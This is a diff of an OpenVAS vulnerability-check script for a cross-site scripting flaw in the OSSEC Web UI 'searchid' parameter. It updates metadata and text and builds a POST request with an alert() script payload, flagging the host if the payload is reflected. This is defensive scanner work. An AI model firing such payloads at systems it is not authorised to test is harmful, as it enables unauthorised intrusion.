@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: sw_ossec-wui_55714.nasl 6194 2017-05-23 09:04:00Z teissa $
+# $Id: sw_ossec-wui_55714.nasl 11423 2018-09-17 07:35:16Z cfischer $
 #
 # OSSEC Web UI 'searchid' Parameter Cross Site Scripting Vulnerability
 #
@@ -29,11 +29,11 @@ CPE = "cpe:/a:ossec:ossec-wui";
 if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.111070");
-  script_version("$Revision: 6194 $");
+  script_version("$Revision: 11423 $");
   script_bugtraq_id(55714);
   script_tag(name:"cvss_base", value:"4.3");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
-  script_tag(name:"last_modification", value:"$Date: 2017-05-23 11:04:00 +0200 (Tue, 23 May 2017) $");
+  script_tag(name:"last_modification", value:"$Date: 2018-09-17 09:35:16 +0200 (Mon, 17 Sep 2018) $");
   script_tag(name:"creation_date", value:"2015-12-13 15:00:00 +0100 (Sun, 13 Dec 2015)");
   script_name("OSSEC Web UI 'searchid' Parameter Cross Site Scripting Vulnerability");
 
@@ -46,19 +46,16 @@ if(description)
   script_tag(name:"impact", value:"An attacker may leverage this issue to execute
   arbitrary script code in the browser of an unsuspecting user in the context of
   the affected site. This can allow the attacker to steal cookie-based authentication
-  credentials and launch other attacks. 
-
-  Impact Level: Application");
+  credentials and launch other attacks.");
 
   script_tag(name:"affected", value:"OSSEC Web UI up to 0.8 is vulnerable.");
 
-  script_tag(name:"solution", value:"No solution or patch was made available for at
-  least one year since disclosure of this vulnerability. Likely none will be provided
-  anymore. General solution options are to upgrade to a newer release, disable respective
-  features, remove the product or replace the product by another one.");
+  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure
+  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
+  release, disable respective features, remove the product or replace the product by another one.");
 
-  script_xref(name : "URL" , value : "http://www.securityfocus.com/archive/1/524247");
-  script_xref(name : "URL" , value : "http://www.securityfocus.com/bid/55714");
+  script_xref(name:"URL", value:"http://www.securityfocus.com/archive/1/524247");
+  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/55714");
   script_category(ACT_ATTACK);
   script_copyright("This script is Copyright (C) 2015 SCHUTZWERK GmbH");
   script_family("Web application abuses");
@@ -76,28 +73,24 @@ include("http_func.inc");
 include("http_keepalive.inc");
 include("host_details.inc");
 
-## Get HTTP Port
 if( ! port = get_app_port( cpe:CPE ) ) exit( 0 );
-
-## Get Location
 if( ! dir = get_app_location( cpe:CPE, port:port ) ) exit( 0 );
 
 if( dir == "/" ) dir = "";
-
-##Construct Attack Request
 url = dir + "/index.php?f=s";
 
+useragent = get_http_user_agent();
 host = http_host_name( port:port );
 
 data = 'monitoring=0&initdate=2015-12-13+11%3A57&finaldate=2015-12-13+15%3A57' +
        '&level=7&grouppattern=ALL&strpattern=&logpattern=ALL&srcippattern=&userpattern=' +
        '&locationpattern=&rulepattern=&max_alerts_per_page=1000&sea' + '\n' + # a newline is needed here
-       'rch=<Search&searchid="><script>alert("OpenVAS-XSS-Test")</script>;';
+       'rch=<Search&searchid="><script>alert("XSS-Test")</script>;';
 len = strlen( data );
 
 req = 'POST ' + url + ' HTTP/1.1\r\n' +
       'Host: ' + host + '\r\n' +
-      'User-Agent: ' + OPENVAS_HTTP_USER_AGENT +'\r\n' +
+      'User-Agent: ' + useragent +'\r\n' +
       'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n' +
       'Accept-Language: en-US,en;q=0.5\r\n' +
       'Content-Type: application/x-www-form-urlencoded\r\n' +
@@ -106,7 +99,7 @@ req = 'POST ' + url + ' HTTP/1.1\r\n' +
       data;
 res = http_keepalive_send_recv( port:port, data:req );
 
-if( res && res =~ "HTTP/1.. 200 OK" && '"><script>alert("OpenVAS-XSS-Test")</script>;' >< res ) {
+if( res && res =~ "HTTP/1.. 200 OK" && '"><script>alert("XSS-Test")</script>;' >< res ) {
   report = report_vuln_url( port:port, url:url );
   security_message( port:port, data:report );
   exit( 0 );
